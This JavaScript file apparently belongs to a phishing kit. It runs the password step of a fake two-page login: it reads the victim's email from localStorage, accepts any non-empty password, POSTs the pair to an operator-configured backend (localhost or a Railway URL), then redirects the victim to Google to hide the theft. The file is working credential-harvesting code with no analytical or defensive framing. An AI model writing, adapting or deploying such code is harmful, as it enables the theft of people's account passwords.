const passwordForm = document.getElementById('passwordForm');
const passwordInput = document.getElementById('password');
const passwordError = document.getElementById('passwordError');
const emailDisplay = document.getElementById('emailDisplay');
const accessBtn = document.getElementById('accessBtn');
const loadingSpinner = document.getElementById('loadingSpinner');
const formContent = document.querySelector('.card-content form');

// ============================================
// IMPORTANT: Update this with your backend URL
// ============================================
const API_BASE_URL = 'http://localhost:5000'; // For local testing
// const API_BASE_URL = 'https://your-railway-url.railway.app'; // For production

// Check if user came from page 1
window.addEventListener('load', function() {
    const userEmail = localStorage.getItem('userEmail');
    
    if (!userEmail) {
        alert('Please login first');
        window.location.href = 'index.html';
        return;
    }
    
    // Display email on page 2
    emailDisplay.textContent = userEmail;
});

// Password Form Submission
passwordForm.addEventListener('submit', async function(e) {
    e.preventDefault();
    
    passwordError.style.display = 'none';
    
    const password = passwordInput.value;
    const userEmail = localStorage.getItem('userEmail');
    
    // Validate password (minimum 1 character)
    if (password.length < 1) {
        passwordError.style.display = 'block';
        passwordError.textContent = 'Please enter a password';
        return;
    }
    
    // Show loading spinner
    formContent.style.display = 'none';
    loadingSpinner.style.display = 'block';
    
    try {
        // Send data to backend
        const response = await fetch(`${API_BASE_URL}/api/submit`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                email: userEmail,
                password: password
            })
        });
        
        const data = await response.json();
        
        if (data.success) {
            console.log('✅ Submission successful');
            // Clear stored email
            localStorage.removeItem('userEmail');
            
            // Redirect to Google
            setTimeout(() => {
                window.location.href = data.redirectUrl || 'https://www.google.com';
            }, 1500);
        } else {
            throw new Error(data.error || 'Submission failed');
        }
    } catch (error) {
        console.error('Error:', error);
        formContent.style.display = 'block';
        loadingSpinner.style.display = 'none';
        passwordError.style.display = 'block';
        passwordError.textContent = 'Connection error. Please try again.';
    }
});

function isValidPassword(password) {
    return password.length > 0;
}

passwordInput.addEventListener('blur', function() {
    if (this.value.length > 0) {
        passwordError.style.display = 'none';
    }
});

passwordInput.addEventListener('keypress', function(e) {
    if (e.key === 'Enter') {
        passwordForm.dispatchEvent(new Event('submit'));
    }
});
